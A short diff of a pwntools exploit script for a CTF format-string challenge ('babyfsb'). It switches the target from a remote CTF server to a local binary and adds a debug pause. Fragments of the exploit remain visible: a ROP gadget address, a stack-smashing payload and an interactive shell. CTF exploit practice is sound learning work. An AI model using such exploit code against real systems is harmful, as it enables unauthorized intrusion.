@@ -1,10 +1,11 @@
 from pwn import *
 
-#p = process('./babyfsb')
-p = remote('ctf.j0n9hyun.xyz', 3032)
+p = process('./babyfsb')
+#p = remote('ctf.j0n9hyun.xyz', 3032)
 e = ELF("./babyfsb")
 l = e.libc
 
+pause()
 context.log_level = "debug"
 
 p_rdi_r = 0x0000000000400793
@@ -46,3 +47,4 @@ payload += 'a' * (0x40 - len(payload)) ##triger stack smashing
 p.sendafter('hello\n', payload)
 
 p.interactive()
+
